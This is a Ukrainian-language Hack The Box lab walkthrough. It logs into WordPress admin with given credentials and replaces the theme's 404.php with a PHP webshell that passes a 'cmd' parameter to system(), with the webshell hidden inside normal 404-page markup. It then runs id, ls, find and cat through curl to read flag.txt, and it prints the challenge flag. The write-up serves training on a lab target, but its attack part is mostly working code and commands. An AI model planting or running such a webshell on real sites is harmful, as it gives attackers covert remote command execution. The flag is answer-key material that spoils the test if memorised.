# RCE via Theme Editor (404.php Webshell)

## Ціль

- Мати адмін-доступ до WordPress.
- Через Theme Editor додати webshell у шаблон 404.
- Виконувати системні команди, прочитати `flag.txt`.

На HTB: флаг з `/home/wp-user/flag.txt` → `HTB{rc3_By_d3s1gn}`.

---

## Крок 1 — Логін в адмінку

```text
URL:   http://TARGET/wp-login.php
Login: admin
Pass:  sunshine1
Після входу потрапляємо в wp-admin.

Крок 2 — Відкрити Theme Editor
Меню зліва:

text
Appearance → Theme Editor
Далі:

У випадаючому списку тем обрати Twenty Seventeen (або будь-яку іншу тему).

Натиснути Select.

Крок 3 — Вибрати файл 404.php
У списку праворуч:

text
Theme Files → 404 Template (404.php)
Клік по 404.php, відкриється код шаблону.

Крок 4 — Вставити webshell
Повністю замінюємо вміст 404.php на:

php
<?php
/**
 * The template for displaying 404 pages (not found)
 */

if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
    exit;
}

get_header();
?>

<div class="wrap">
    <div id="primary" class="content-area">
        <main id="main" class="site-main" role="main">

            <section class="error-404 not-found">
                <header class="page-header">
                    <h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'twentyseventeen' ); ?></h1>
                </header><!-- .page-header -->
                <div class="page-content">
                    <p><?php _e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentyseventeen' ); ?></p>

                    <?php get_search_form(); ?>

                </div><!-- .page-content -->
            </section><!-- .error-404 -->
        </main><!-- #main -->
    </div><!-- #primary -->
</div><!-- .wrap -->

<?php
get_footer();
Натискаємо Update File.

Крок 5 — Перевірка RCE
Перевіряємо виконання команд:

bash
curl "$TARGET/wp-content/themes/twentyseventeen/404.php?cmd=id"
Очікуваний результат:

text
uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
Маємо RCE від імені користувача wp-user.

Крок 6 — Пошук та читання флагу
Подивитися вміст домашньої директорії:

bash
curl "$TARGET/wp-content/themes/twentyseventeen/404.php?cmd=ls+/home/wp-user"
Результат:

text
flag.txt
Прочитати флаг:

bash
curl "$TARGET/wp-content/themes/twentyseventeen/404.php?cmd=cat+/home/wp-user/flag.txt"
Отримуємо:

text
HTB{rc3_By_d3s1gn}
Це відповідь у завданні.

Корисні команди через webshell
bash
# Хто ми
?cmd=id

# Поточна директорія
?cmd=pwd

# Переглянути дерево файлів
?cmd=ls+-la

# Знайти всі flag.txt
?cmd=find+/+ -name+flag.txt+2>/dev/null
